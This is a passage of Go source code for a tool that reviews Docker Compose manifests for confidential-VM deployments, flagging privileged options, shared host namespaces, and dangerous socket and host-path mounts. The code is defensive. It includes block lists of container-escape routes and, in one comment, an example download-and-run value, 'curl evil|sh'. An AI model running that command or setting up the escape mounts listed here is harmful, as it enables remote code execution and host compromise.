// reviewService applies the per-service rules and records the service's image.
func (r *ComposeReview) reviewService(name string, body *yaml.Node, mounts *mountIndex) {
	svc := ReviewedService{Name: name}
	if body == nil || body.Kind != yaml.MappingNode {
		r.Services = append(r.Services, svc)
		r.add(SeverityBlocking, name, "",
			"the service body is not a mapping, so nothing about it could be read")
		return
	}

	if img := mapValue(body, "image"); img != nil && img.Kind == yaml.ScalarNode {
		svc.Ref = strings.TrimSpace(img.Value)
		// compose.SplitImageRef, not a second parser: it is a pure string split, and its
		// only failure mode is losing a digest it could not find — which turns into the
		// "not pinned" finding below. A splitter that erred the other way, inventing a
		// digest, would be the one thing that must not happen here.
		svc.Image, svc.Tag, svc.Digest = compose.SplitImageRef(svc.Ref)
		svc.Origin = classifyOrigin(svc.Image)
	}
	r.Services = append(r.Services, svc)

	switch {
	case svc.Ref == "" && mapValue(body, "build") != nil:
		r.add(SeverityBlocking, name, "build",
			"the service is built at deploy time, so the compose hash commits to a Dockerfile path "+
				"rather than to image content; there is nothing a baseline could pin")
	case svc.Ref == "":
		r.add(SeverityBlocking, name, "image", "the service names no image")
	case !svc.Pinned():
		r.add(SeverityBlocking, name, "image", fmt.Sprintf(
			"%s is not pinned by @sha256:; the compose hash then commits to a NAME, and what that name "+
				"resolves to is the registry's choice, made after the measurement", svc.Ref))
	}
	// Our namespace on someone else's registry. Not a verdict — a mirror is a real
	// reason to see this — but it is the one origin a reviewer must not skim past,
	// because the line reads as ours at a glance.
	if svc.Origin == OriginForeignRegistry {
		reg, _ := splitRegistry(svc.Image)
		r.add(SeverityJustify, name, "image", fmt.Sprintf(
			"%s carries our namespace %q on %s, which is not a registry we publish through. It may be a "+
				"pull-through mirror, and it may be an image named to look like ours — either way we cannot "+
				"answer for its contents, so it needs an upstream answer like any third-party image",
			svc.Ref, firstPartyNamespace, reg))
	}
	if mapValue(body, "build") != nil && svc.Ref != "" {
		r.add(SeverityJustify, name, "build",
			"the service declares both an image and a build; which one ran depends on how the deployment was "+
				"brought up, so the manifest alone does not say what is in the container")
	}

	for i := 0; i+1 < len(body.Content); i += 2 {
		key, val := body.Content[i].Value, body.Content[i+1]
		if key == "" || key == "image" || key == "build" || benignServiceKeys[key] {
			continue
		}
		if strings.HasPrefix(key, "x-") {
			continue // an extension field; compose itself ignores it
		}
		if key == "volumes" {
			r.reviewVolumes(name, val, mounts)
			continue
		}
		if handled := r.reviewServiceKey(name, key, val); !handled {
			r.add(SeverityJustify, name, key,
				"this review has no rule for the key; read it before treating the manifest as a baseline")
		}
	}
}

// reviewServiceKey applies the rule for one privileged-ish service key, returning
// false when there is no rule for it (the caller then reports it as unread).
//
// Every branch that reads a value also handles the value being the wrong SHAPE, and
// reports that rather than defaulting to "off". `privileged: yes-ish-typo` must not
// read as absent — a rule that silently treats what it cannot parse as safe is worse
// than no rule, because it produces a clean line.
func (r *ComposeReview) reviewServiceKey(name, key string, val *yaml.Node) bool {
	switch key {
	case "privileged":
		if b, ok := nodeBool(val); !ok {
			r.add(SeverityBlocking, name, key, "the value is not a boolean, so it could not be read; treat as set")
		} else if b {
			r.add(SeverityBlocking, name, key,
				"the container runs privileged: it holds every capability, sees every host device, and can "+
					"reach the other containers' state. Inside a CVM that makes the whole guest one trust domain, "+
					"so no per-service reasoning below it holds")
		}
		return true

	case "cap_add":
		caps, ok := nodeStrings(val)
		if !ok {
			r.add(SeverityBlocking, name, key, "the value is not a list of capabilities, so it could not be read")
		} else if len(caps) > 0 {
			r.add(SeverityBlocking, name, key, fmt.Sprintf(
				"adds %s beyond the default set; each one is a specific way out of the container",
				strings.Join(caps, ", ")))
		}
		return true

	case "security_opt":
		opts, ok := nodeStrings(val)
		if !ok {
			r.add(SeverityBlocking, name, key, "the value is not a list, so it could not be read")
			return true
		}
		for _, o := range opts {
			l := strings.ToLower(o)
			if strings.Contains(l, "unconfined") || strings.Contains(l, "label:disable") ||
				strings.Contains(l, "label=disable") || strings.Contains(l, "systempaths") {
				r.add(SeverityBlocking, name, key, fmt.Sprintf(
					"%s switches off a confinement the runtime applies by default", o))
			}
		}
		return true

	case "device_cgroup_rules":
		rules, ok := nodeStrings(val)
		if !ok {
			r.add(SeverityBlocking, name, key, "the value is not a list of rules, so it could not be read")
		} else if len(rules) > 0 {
			r.add(SeverityBlocking, name, key, fmt.Sprintf(
				"the service grants itself device access by cgroup rule (%s), which names devices the manifest "+
					"does not list", strings.Join(rules, ", ")))
		}
		return true

	case "volumes_from":
		from, ok := nodeStrings(val)
		if !ok {
			r.add(SeverityBlocking, name, key, "the value is not a list, so it could not be read")
		} else if len(from) > 0 {
			r.add(SeverityBlocking, name, key, fmt.Sprintf(
				"the service takes %s's mounts wholesale, so its filesystem surface is whatever that "+
					"container's is — not something this manifest states", strings.Join(from, ", ")))
		}
		return true

	case "cgroup":
		v, ok := r.scalar(SeverityBlocking, name, key, val)
		if ok && strings.EqualFold(v, "host") {
			r.add(SeverityBlocking, name, key, "the container joins the host cgroup namespace")
		}
		return true

	case "cgroup_parent":
		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && v != "" {
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"the container is placed under cgroup %s, outside the tree the runtime would manage", v))
		}
		return true

	case "pid":
		v, ok := r.scalar(SeverityBlocking, name, key, val)
		switch {
		case !ok:
		case strings.EqualFold(v, "host"):
			r.add(SeverityBlocking, name, key,
				"the container shares the host PID namespace: it can see and signal every process in the CVM, "+
					"including the ones holding the sealing keys")
		case v != "":
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"the container shares a PID namespace (%s), so process isolation between the two is gone", v))
		}
		return true

	case "network_mode":
		v, ok := r.scalar(SeverityBlocking, name, key, val)
		switch {
		case !ok:
		case strings.EqualFold(v, "host"):
			r.add(SeverityBlocking, name, key,
				"the container shares the host network namespace, so the compose file's port mapping describes "+
					"nothing and it can reach every listener in the CVM, loopback included")
		case strings.HasPrefix(strings.ToLower(v), "container:"), strings.HasPrefix(strings.ToLower(v), "service:"):
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"the container shares another container's network namespace (%s)", v))
		}
		return true

	case "ipc":
		v, ok := r.scalar(SeverityJustify, name, key, val)
		l := strings.ToLower(v)
		switch {
		case !ok:
		case l == "host", l == "shareable", strings.HasPrefix(l, "container:"), strings.HasPrefix(l, "service:"):
			// A GPU model server legitimately needs a shared IPC namespace for its
			// shared-memory transport, which is why this is not blocking.
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"the container shares an IPC namespace (%s): shared memory is a channel that does not appear "+
					"anywhere else in the manifest, so a baseline has to name which services are allowed it and why", v))
		}
		return true

	case "uts":
		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && strings.EqualFold(v, "host") {
			r.add(SeverityJustify, name, key, "the container shares the host UTS namespace")
		}
		return true

	case "userns_mode":
		if v, ok := r.scalar(SeverityJustify, name, key, val); ok && strings.EqualFold(v, "host") {
			r.add(SeverityJustify, name, key,
				"the container opts out of user-namespace remapping, so its root is the CVM's root wherever "+
					"the runtime would otherwise have remapped it")
		}
		return true

	case "devices":
		if devs, ok := nodeStrings(val); !ok {
			r.add(SeverityJustify, name, key, "the value is not a list, so it could not be read")
		} else if len(devs) > 0 {
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"passes host devices into the container (%s); GPU work needs this, so a baseline names the "+
					"services that get it rather than refusing it", strings.Join(devs, ", ")))
		}
		return true

	case "<<":
		// A YAML merge key. yaml.v3 does not resolve it when decoding into a Node, so the
		// keys that actually apply to this service are in the anchor, not in the body this
		// walk can see. Blocking rather than "no rule for this key": the review cannot
		// describe the service at all, and `privileged: true` hidden behind an anchor must
		// not come out as a vague note.
		r.add(SeverityBlocking, name, key,
			"the service body is merged from a YAML anchor, so the keys that actually apply to it are not "+
				"the ones read here; this review cannot describe the service")
		return true

	case "sysctls":
		if nodeHasContent(val) {
			r.add(SeverityJustify, name, key, "the container sets kernel parameters, which apply to a namespace it shares")
		}
		return true

	case "group_add":
		groups, ok := nodeStrings(val)
		if !ok {
			r.add(SeverityJustify, name, key, "the value is not a list of groups, so it could not be read")
		} else if len(groups) > 0 {
			r.add(SeverityJustify, name, key, fmt.Sprintf(
				"the container joins extra groups (%s), which is how access to a device or socket is granted "+
					"without a capability", strings.Join(groups, ", ")))
		}
		return true

	case "extra_hosts":
		if nodeHasContent(val) {
			r.add(SeverityNote, name, key,
				"the container's name resolution is overridden in the manifest; a name it connects to may not be "+
					"the host that name resolves to elsewhere")
		}
		return true

	case "dns", "dns_search", "dns_opt":
		if nodeHasContent(val) {
			r.add(SeverityNote, name, key, "the container resolves names through a resolver the manifest chose")
		}
		return true

	case "links", "external_links":
		if nodeHasContent(val) {
			r.add(SeverityNote, name, key, "legacy container linking; the connection it creates is not in the networks section")
		}
		return true

	case "secrets", "configs":
		if nodeHasContent(val) {
			r.add(SeverityJustify, name, key,
				"files are injected into the container from outside its image, so what it runs on is not fully "+
					"described by the image digest")
		}
		return true

	case "oom_kill_disable":
		if b, ok := nodeBool(val); ok && b {
			r.add(SeverityNote, name, key, "the container is exempt from the OOM killer, so it can starve its neighbours")
		}
		return true
	}
	return false
}

// scalar reads a scalar service key, REPORTING at sev when the value is present but is
// not a scalar and returning ok=false so the rule skips rather than acting on "".
//
// `pid: [host]` is the case this exists for. Without it nodeScalar's "" reads as absent,
// the rule stays quiet, and the report prints a clean line for a service that shares the
// host PID namespace — the wrong-shape-reads-as-safe failure this file's header calls
// out, on the branch where it costs the most.
func (r *ComposeReview) scalar(sev Severity, name, key string, val *yaml.Node) (string, bool) {
	v, ok := nodeScalar(val)
	if !ok {
		r.add(sev, name, key,
			"the value is not a scalar, so it could not be read; treat it as set to whatever it names")
		return "", false
	}
	return v, true
}

// guestAgentSockets are the dstack guest-agent endpoints. A container holding one can
// derive the app's keys and request quotes IN THE APP'S NAME — it is the app's
// identity, not merely a debugging channel. read_only does not reduce this: it is a
// socket, and the access is the connection, not the write.
var guestAgentSockets = map[string]bool{
	"/var/run/dstack.sock": true,
	"/var/run/tappd.sock":  true,
	"/run/dstack.sock":     true,
	"/run/tappd.sock":      true,
}

// dockerSockets hand a container control of the container runtime, which is a
// complete escape: it can start a privileged container of its own.
var dockerSockets = map[string]bool{
	"/var/run/docker.sock":                true,
	"/run/docker.sock":                    true,
	"/var/run/containerd/containerd.sock": true,
}

// blockingHostPrefixes are host trees no service in an attested deployment should be
// handed. /dev/shm is carved out below — a shared-memory mount is a real need and gets
// justified, not refused.
var blockingHostPrefixes = []string{
	"/proc", "/sys", "/dev", "/etc", "/boot", "/root", "/home", "/usr", "/bin", "/sbin",
	"/lib", "/lib64", "/var/lib/docker", "/var/lib/containerd", "/var/log",
}

// blockingHostExact are the host paths that are only ever a mistake as a whole.
var blockingHostExact = map[string]bool{
	"/": true, "/var": true, "/var/run": true, "/run": true, "/var/lib": true,
}

// reviewVolumes reads a service's volumes and records each source in mounts, so the
// cross-service pass can report the ones two containers hold at once.
func (r *ComposeReview) reviewVolumes(name string, val *yaml.Node, mounts *mountIndex) {
	if val == nil || val.Kind != yaml.SequenceNode {
		r.add(SeverityJustify, name, "volumes", "the value is not a list of mounts, so it could not be read")
		return
	}
	for _, entry := range val.Content {
		src, target, ro, ok := parseMount(entry)
		if !ok {
			r.add(SeverityJustify, name, "volumes",
				"a mount entry could not be read, so what it exposes is unknown")
			continue
		}
		if src == "" {
			continue // an anonymous volume: created empty, reachable by nothing else
		}
		mounts.holders[src] = append(mounts.holders[src], name)

		// Three kinds of source, decided in this order because only the first is not a
		// host path. An ABSOLUTE path is never the relative case, however many ".."
		// segments it carries — getting that backwards sent /opt/../etc down the
		// "unresolvable" branch at Justify, with a detail that was also false (an absolute
		// path does not depend on the deployment directory). Cleaning decides it now, in
		// hostPathVerdict.
		switch {
		case isNamedVolume(src):
			// Resolve through the top-level section before deciding it is harmless.
			// `- etcbind:/host-etc` over a volume whose driver_opts.device is /etc IS
			// `- /etc:/host-etc`, and this is where the two become the same finding.
			decl, declared := mounts.volumes[src]
			switch {
			case declared && decl.HostPath != "":
				mounts.named[src] = true
				sev, clean, why := hostPathVerdict(decl.HostPath)
				where := fmt.Sprintf("%s -> %s (%s) resolves to the HOST PATH %s%s (compose.volumes.%s driver_opts.device)",
					src, target, mode(ro), decl.HostPath, normalizedAs(decl.HostPath, clean), src)
				if why != "" {
					r.add(sev, name, "volumes", where+": "+why)
				} else {
					r.add(SeverityJustify, name, "volumes", where+
						": a host bind wearing a volume name, which a baseline reading service mounts alone would not see")
				}
			case declared && decl.Opaque != "":
				mounts.named[src] = true
				r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
					"%s -> %s (%s): %s, so what the container reads through it is unknown",
					src, target, mode(ro), decl.Opaque))
			case !declared:
				// Compose requires a top-level declaration for a named volume, so a mount
				// naming one that is not there means either an implicit external volume or a
				// manifest this review is not reading the way the runtime does.
				r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
					"%s -> %s (%s) names a volume the compose file does not declare, so its source is not in "+
						"the manifest", src, target, mode(ro)))
			}
			// The shared-mount pass covers the plain-named case.

		case !strings.HasPrefix(src, "/"):
			// A relative bind resolves against wherever the manifest was deployed FROM,
			// which the manifest does not record — so "./data" and "../../../etc" are
			// indistinguishable here and the path rules cannot be applied honestly.
			// Reported rather than skipped, which is what treating it as a named volume
			// would silently do.
			r.add(SeverityJustify, name, "volumes", fmt.Sprintf(
				"%s -> %s: a RELATIVE bind mount. What it exposes depends on the directory the deployment was "+
					"brought up from, which is not in the manifest, so this review cannot say what the container reads",
				src, target))

		default:
			// A direct host bind. Marking the source named keeps reviewSharedMounts off it:
			// a line saying which service holds it and what it grants is strictly more than
			// "two services share this", and printing both makes one mount read as two
			// problems.
			if sev, clean, why := hostPathVerdict(src); why != "" {
				mounts.named[src] = true
				r.add(sev, name, "volumes", fmt.Sprintf("%s%s -> %s (%s): %s",
					src, normalizedAs(src, clean), target, mode(ro), why))
			}
		}
	}
}

// mode renders a mount's read-only flag.
func mode(ro bool) string {
	if ro {
		return "ro"
	}
	return "rw"
}

// hostPathVerdict is the one place a host path is judged. why is "" for a path with
// nothing to say about it; clean is the path the rules were applied to, which a caller
// prints when it differs from what the manifest wrote.
//
// It exists as a function rather than a switch inside reviewVolumes because three
// different constructs deliver a host path into a container — a direct bind, a named
// volume whose driver_opts.device is a path, and a top-level secret/config `file:` — and
// each was a separate way to reach the same exposure. Three copies of the rules would
// have been three chances for one of them to be the lenient one.
//
// NORMALIZATION IS PART OF THE VERDICT, and belongs here for exactly that reason. Every
// rule below matches on a literal — two exact maps and a segment-prefix walk — so all
// three assume a canonical path, and `//var/run/docker.sock`, `/./etc`, `/opt/../etc`
// and `/etc/` all reported nothing while their canonical spellings were blocking. A
// complete runtime escape came back as a clean line. Cleaning at each call site instead
// would have been the same three-chances-to-be-lenient mistake one level down.
//
// path.Clean, not filepath.Clean: these are paths inside a Linux guest, and the verdict
// must not depend on the OS this tool is built for. It is applied here and NOT before
// the named-volume-versus-bind decision, where it would rewrite "./data" to "data" and
// make a relative bind look like a volume name.
func hostPathVerdict(p string) (sev Severity, clean, why string) {
	clean = path.Clean(p)
	switch {
	case guestAgentSockets[clean]:
		return SeverityJustify, clean, "the guest-agent socket. A container holding it can derive the app's keys and " +
			"obtain quotes in the app's name, so every service with it is as trusted as the app itself — a " +
			"baseline must list them exactly, and read_only changes nothing for a socket"
	case dockerSockets[clean]:
		return SeverityBlocking, clean, "the container runtime's socket. A container holding it can start any container " +
			"it likes, privileged included, so it is a complete escape from everything else in this manifest"
	case clean == "/dev/shm" || strings.HasPrefix(clean, "/dev/shm/"):
		return SeverityJustify, clean, "shared memory. Legitimate for a model server's transport, and a channel between " +
			"whoever holds it"
	case blockingHostExact[clean], hasPrefixPath(clean, blockingHostPrefixes):
		return SeverityBlocking, clean, "a host tree the CVM's own OS owns. Whatever the image digest says the container " +
			"contains, this is what it actually reads"
	}
	return SeverityNote, clean, ""
}

// normalizedAs renders " (normalizes to X)" when cleaning changed the path, so a
// blocking line about `//var/run/docker.sock` says which rule it hit.
func normalizedAs(wrote, clean string) string {
	if wrote == clean {
		return ""
	}
	return fmt.Sprintf(" (normalizes to %s)", clean)
}

// reviewSharedMounts reports the sources held by more than one service. A writable
// mount two containers share is a channel that appears nowhere else in the manifest:
// neither service's image digest, ports or environment mentions it, so a baseline
// that reasons service-by-service misses it entirely. Reported at Justify because
// sharing is often the point (a socket directory, a model cache) — the obligation is
// to have decided each pair, not to remove them.
func (r *ComposeReview) reviewSharedMounts(mounts *mountIndex) {
	for _, src := range sortedStringKeys(mounts.holders) {
		if mounts.named[src] {
			continue // already reported per service, with what it grants
		}
		holders := dedupe(mounts.holders[src])
		if len(holders) < 2 {
			continue
		}
		r.add(SeverityJustify, "", "volumes", fmt.Sprintf(
			"%s is mounted by %s: a shared mount is a channel between them that nothing else in the manifest names",
			src, strings.Join(holders, ", ")))
	}
}

// parseMount reads one volumes entry in either compose syntax. ok is false when the
// entry is a shape this cannot read — reported rather than skipped, since an
// unreadable mount is an unknown exposure.
func parseMount(n *yaml.Node) (src, target string, readOnly, ok bool) {
	switch {
	case n == nil:
		return "", "", false, false

	case n.Kind == yaml.ScalarNode:
		// Short syntax: [source:]target[:mode].
		parts := strings.Split(n.Value, ":")
		switch len(parts) {
		case 1:
			return "", parts[0], false, true
		case 2:
			return parts[0], parts[1], false, true
		case 3:
			return parts[0], parts[1], strings.Contains(parts[2], "ro"), true
		default:
			return "", "", false, false
		}

	case n.Kind == yaml.MappingNode:
		// Long syntax. A bind with no source (type: tmpfs / volume) is legitimate and
		// comes back as an anonymous mount — but a source or target that is present and
		// NOT a scalar makes the whole entry unreadable, which the caller reports. Reading
		// it as an anonymous mount would drop the finding.
		srcVal, srcOK := nodeScalar(mapValue(n, "source"))
		targetVal, targetOK := nodeScalar(mapValue(n, "target"))
		if !srcOK || !targetOK {
			return "", "", false, false
		}
		readOnly, _ = nodeBool(mapValue(n, "read_only"))
		return strings.TrimSpace(srcVal), strings.TrimSpace(targetVal), readOnly, true

	default:
		return "", "", false, false
	}
}

// classifyOrigin reads the registry AND the namespace out of an image repository. See
// ImageOrigin for why the answer is a column in a report and not a rule.
//
// Both halves, because the namespace alone means nothing: anyone can push
// "0gfoundation/broker" to a registry they control, and a classifier that read the path
// and ignored the host called that first-party — i.e. said "ask us and we can resolve
// this" about an image we never published.
func classifyOrigin(image string) ImageOrigin {
	registry, repo := splitRegistry(strings.TrimSpace(image))
	if repo == "" {
		return OriginNone
	}
	ns, _, hasNamespace := strings.Cut(repo, "/")
	if !hasNamespace || !strings.EqualFold(ns, firstPartyNamespace) {
		return OriginThirdParty
	}
	if firstPartyRegistries[strings.ToLower(registry)] {
		return OriginFirstParty
	}
	return OriginForeignRegistry
}

// splitRegistry separates an image reference's registry host from its repository path,
// returning "" for the implicit Docker Hub host.
//
// The first segment is a host only when it LOOKS like one — it contains a "." or a ":",
// or is exactly "localhost" — which is the rule the reference grammar uses. Without it
// "0gfoundation/broker" would have "0gfoundation" read as a registry, and
// "mysql" would have no repository left at all.
func splitRegistry(image string) (registry, repo string) {
	first, rest, hasSlash := strings.Cut(image, "/")
	if hasSlash && (strings.Contains(first, ".") || strings.Contains(first, ":") || first == "localhost") {
		return first, rest
	}
	return "", image
}

// --- small readers -------------------------------------------------------------
//
// EVERY reader that can fail returns an `ok`, and ABSENT is not a failure: a missing
// node or field comes back as (zero, true), a present-but-wrong-shape one as (zero,
// false). The two must be separate return values rather than one zero value, because
// the whole review rests on never confusing them — `privileged: sort-of` and no
// `privileged:` at all produce the same zero, and a reader that collapsed them would
// hand every rule a silent way to pass. The compiler enforces the discipline: there is
// no single-value form of these to call by accident.

func mapValue(n *yaml.Node, key string) *yaml.Node {
	if n == nil || n.Kind != yaml.MappingNode {
		return nil
	}
	for i := 0; i+1 < len(n.Content); i += 2 {
		if n.Content[i].Value == key {
			return n.Content[i+1]
		}
	}
	return nil
}

// declaredExternal reports whether a volume, secret, config or network declaration says
// it is external — i.e. this manifest does not create it, so its contents are whatever
// already exists on the host under that name.
//
// `external: true` and the long `external: {name: …}` form both mean external, and a
// shape this cannot read is treated as external too: the lenient reading here would be
// "the manifest creates it", which is the claim that makes the finding disappear.
func declaredExternal(decl *yaml.Node) bool {
	e := mapValue(decl, "external")
	if e == nil {
		return false
	}
	ext, ok := nodeBool(e)
	return !ok || ext
}

// nodeHasContent reports whether the node carries anything. The presence-only rules use
// it because a rule that fires on the KEY rather than on its contents reports a finding
// an operator cannot act on: `sysctls: {}` sets no kernel parameter, and telling someone
// it does teaches them to ignore the line.
func nodeHasContent(n *yaml.Node) bool {
	if n == nil {
		return false
	}
	switch n.Kind {
	case yaml.SequenceNode, yaml.MappingNode:
		return len(n.Content) > 0
	case yaml.ScalarNode:
		return n.Tag != "!!null" && strings.TrimSpace(n.Value) != ""
	default:
		// An alias or anything else: assume content. Guessing "empty" for a shape this
		// cannot read is the one direction that loses a finding.
		return true
	}
}

// isNamedVolume reports whether a mount source is a compose VOLUME NAME rather than a
// host path. Compose names match `[a-zA-Z0-9][a-zA-Z0-9_.-]*`: no slashes, no "~", and
// never a leading "." — so any other non-absolute source is a relative host path, and
// the caller says so instead of quietly filing it as a volume.
//
// Testing for the name, rather than testing for "looks relative", is what keeps the
// three cases exhaustive: every source is a name, an absolute path, or a relative path,
// and each branch of the switch in reviewVolumes handles exactly one.
func isNamedVolume(src string) bool {
	return src != "" && !strings.HasPrefix(src, "/") && !strings.HasPrefix(src, ".") &&
		!strings.ContainsAny(src, "/~")
}

// nodeScalar reads a scalar node. ok is false when the node is PRESENT but is not a
// scalar — `pid: [host]`, `network_mode: {mode: host}` — which is the case that used to
// read as absent and take the rule with it.
func nodeScalar(n *yaml.Node) (val string, ok bool) {
	if n == nil {
		return "", true
	}
	if n.Kind != yaml.ScalarNode {
		return "", false
	}
	return strings.TrimSpace(n.Value), true
}

// nodeBool reads a boolean node, on the same contract as the readers above: a missing
// node is (false, true) — absent, and readably so — while a node that is present and is
// not a boolean is (false, false). The two used to share ok=false here, which is the
// exact conflation this section exists to prevent.
func nodeBool(n *yaml.Node) (val, ok bool) {
	if n == nil {
		return false, true
	}
	var b bool
	if err := n.Decode(&b); err != nil {
		return false, false
	}
	return b, true
}

// nodeStrings reads a sequence of scalars. ok is false when the node is present but is
// not such a sequence; a missing node comes back (nil, true) — nothing there to read
// is not the same as unreadable.
func nodeStrings(n *yaml.Node) ([]string, bool) {
	if n == nil {
		return nil, true
	}
	// An explicit null — `volumes_from:` with nothing after it — is EMPTY, not
	// unreadable. Compose reads it as an empty list, and so do the JSON readers below
	// for their own null; without this the whole list family reports "could not be
	// read" for a key that says nothing.
	if n.Kind == yaml.ScalarNode && (n.Tag == "!!null" || strings.TrimSpace(n.Value) == "") {
		return nil, true
	}
	if n.Kind != yaml.SequenceNode {
		return nil, false
	}
	out := make([]string, 0, len(n.Content))
	for _, c := range n.Content {
		if c.Kind != yaml.ScalarNode {
			return nil, false
		}
		out = append(out, strings.TrimSpace(c.Value))
	}
	return out, true
}

func has(fields map[string]json.RawMessage, key string) bool {
	_, ok := fields[key]
	return ok
}

// jsonString, jsonStrings and jsonBool follow nodeScalar's contract on the app-compose
// side: an absent field is (zero, true), a field of the wrong JSON type is (zero,
// false). `kms_enabled: "true"`, `public_logs: 1` and
// `pre_launch_script: ["curl evil|sh"]` are all the second case — and the last of those
// is root TCB, so reading it as absent is the most expensive version of this mistake.
func jsonString(raw json.RawMessage) (val string, ok bool) {
	if len(raw) == 0 || string(raw) == "null" {
		return "", true
	}
	var s string
	if json.Unmarshal(raw, &s) != nil {
		return "", false
	}
	return s, true
}

func jsonStrings(raw json.RawMessage) (val []string, ok bool) {
	if len(raw) == 0 || string(raw) == "null" {
		return nil, true
	}
	var s []string
	if json.Unmarshal(raw, &s) != nil {
		return nil, false
	}
	return s, true
}

func jsonBool(raw json.RawMessage) (val, ok bool) {
	if len(raw) == 0 || string(raw) == "null" {
		return false, true
	}
	var b bool
	if json.Unmarshal(raw, &b) != nil {
		return false, false
	}
	return b, true
}

func sortedKeys(m map[string]json.RawMessage) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func sortedStringKeys(m map[string][]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func dedupe(in []string) []string {
	seen := make(map[string]bool, len(in))
	out := make([]string, 0, len(in))
	for _, s := range in {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

// hasPrefixPath reports whether p is one of the trees in prefixes — matching on path
// SEGMENTS, so /etc catches /etc/hosts but /devices is not read as being under /dev.
func hasPrefixPath(p string, prefixes []string) bool {
	for _, pre := range prefixes {
		if p == pre || strings.HasPrefix(p, pre+"/") {
			return true
		}
	}
	return false
}
